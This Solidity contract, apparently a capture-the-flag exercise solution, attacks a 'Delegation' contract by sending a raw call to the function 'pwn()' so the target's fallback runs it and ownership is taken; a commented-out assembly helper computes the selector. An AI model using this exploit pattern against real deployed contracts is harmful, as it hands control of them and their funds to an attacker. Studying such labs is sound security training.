// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        address(contractAddress).call(abi.encodeWithSignature("pwn()"));
    }

    // function _funcSelector() internal pure returns(byte4) {
    //     bytes32 hash = keccak256(abi.encodePacked("pwn()"));

    //     assembly {
    //         let res:= shr(224, hash)
    //         mstore(0x0, res)
    //         return (28, 32)
    //     }
    // }
}
